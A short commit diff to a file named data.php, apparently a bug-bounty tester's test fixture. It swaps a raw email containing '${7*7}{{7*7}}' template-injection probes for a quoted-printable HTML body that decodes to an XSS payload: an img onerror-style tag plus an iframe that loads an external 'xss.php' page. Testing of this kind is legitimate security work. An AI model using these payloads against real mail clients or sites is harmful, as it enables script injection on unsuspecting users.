99e2df81f291ed50ff91adac86c8bf7165fc1cbc
missoum1307 <missoum1307@users.noreply.github.com>
2019-05-31 06:22:44 +0200

    Update data.php

--- data.php
+++ data.php
@@ -1,22 +1,6 @@
-<?php 
-header('content-type: text/plain; charset=utf-8');
-header('x-content-type-options: nosniff');
-?>
-MIME-Version: 1.0
-Date: Tue, 28 May 2019 07:43:41 +0200
-Message-ID: <CAF9sqr+Ere_H7eLCy0J-ZJdYqxz1AK=J5_v9fP_Rsk905Qr6kw@mail.gmail.com>
-Subject: 
-From: "aaa${7*7}{{7*7}}xxx aaa${7*7}{{7*7}}xxx" <admin@missoumsai.com>
-Content-Type: multipart/alternative; boundary="000000000000dbdc890589ec255c"
+TESTEML
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
 
---000000000000dbdc890589ec255c
-Content-Type: text/plain; charset="UTF-8"
+=3Cimg=20src=3Dx=3E=3Ciframe=20src=3D=22https=3A=2F=2Fbughunt1307.herokuapp.com=2Fxss.php=3Fname=3Dxxx=22=3E
 
-https://poly.google.com/_/VrZandriaUi/manifest.json
-
---000000000000dbdc890589ec255c
-Content-Type: text/html; charset="UTF-8"
-
-<div dir="ltr"><a href="https://poly.google.com/_/VrZandriaUi/manifest.json">https://poly.google.com/_/VrZandriaUi/manifest.json</a><br></div>
-
---000000000000dbdc890589ec255c--
